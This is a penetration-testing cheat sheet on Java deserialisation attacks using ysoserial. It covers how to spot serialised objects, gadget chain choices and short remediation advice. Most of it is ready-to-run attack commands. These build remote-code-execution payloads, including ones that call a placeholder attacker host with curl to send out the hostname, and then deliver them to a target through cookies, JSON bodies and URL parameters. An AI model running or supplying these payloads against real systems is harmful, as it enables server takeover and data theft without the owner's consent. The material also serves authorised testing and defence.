# Java Deserialization — ysoserial RCE

## Summary
Java serialisation is used extensively in Java EE applications. `ObjectInputStream.readObject()` triggers `readObject()` / `readResolve()` / `readExternal()` methods. Gadget chains in common libraries (CommonsCollections, CommonsBeanUtils, Spring) achieve RCE.

## Identification

### Magic Bytes
```
Raw:    AC ED 00 05  (or \xac\xed\x00\x05)
Base64: rO0AB...
```

### Common Locations
- Cookies: `JSESSIONID`, `token`, `auth`, `remember-me`
- Hidden form fields: `__VIEWSTATE`, `data`
- Request body with Content-Type: `application/x-java-serialized-object`
- HTTP headers: `Authorization: Bearer <base64>`

## ysoserial Usage

```bash
# List all gadget chains
java -jar ysoserial.jar -h

# CommonsCollections1 (JDK < 8u20)
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# CommonsCollections2 (JDK >= 8u20, different chain)
java -jar ysoserial.jar CommonsCollections2 'ping ATTACKER.dnslog.cn'

# CommonsCollections4
java -jar ysoserial.jar CommonsCollections4 'curl http://ATTACKER/'

# URLDNS — Blind detection (no RCE, just DNS lookup)
java -jar ysoserial.jar URLDNS 'http://COLLABORATOR.burpcollaborator.net' | base64
```

## Gadget Chain Reference

| Chain | Dependency | Notes |
|-------|-----------|-------|
| CommonsCollections1 | commons-collections 3.1 | JDK < 8u20 |
| CommonsCollections2 | commons-collections4 | Works on newer JDK |
| CommonsCollections3 | commons-collections 3.1 | JDK < 8u20 |
| CommonsCollections4 | commons-collections4 | Works on newer JDK |
| CommonsBeanUtils1 | commons-beanutils | Broad compatibility |
| Spring1 | spring-core | No commons-collections needed |
| Jdk7u21 | JDK only | Native JDK chain |
| JRMPClient | RMI | For out-of-band detection |
| C3P0 | c3p0 | JNDI injection variant |

## Detection with URLDNS

```bash
# Safe probe — only DNS, no RCE
PAYLOAD=$(java -jar ysoserial.jar URLDNS 'http://COLLABORATOR.burpcollaborator.net' | base64 -w0)
curl -b "token=$PAYLOAD" https://target.com/
# Check collaborator for DNS callback
```

## Blind Deserialisation (no callback visible)

When no output is directly observable:
```bash
# Sleep-based timing
java -jar ysoserial.jar CommonsCollections1 'sleep 10'

# Out-of-band via curl / wget
java -jar ysoserial.jar CommonsCollections1 'curl http://ATTACKER/$(hostname)'
```

## Common Encodings

```bash
# Raw bytes (binary POST)
printf '\xac\xed\x00\x05...' | curl -X POST --data-binary @- https://target.com/

# Base64 in JSON body
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0)
curl -X POST https://target.com/api \
  -H "Content-Type: application/json" \
  -d "{\"data\":\"$PAYLOAD\"}"

# Hex-encoded in URL param
curl "https://target.com/?data=aced0005..."
```

## Remediation
- Do not accept serialised Java objects from untrusted sources
- Use a deserialisation whitelist filter (`ObjectInputFilter`)
- Implement HMAC integrity checks on serialised data
- Use JSON or protobuf instead of Java serialisation
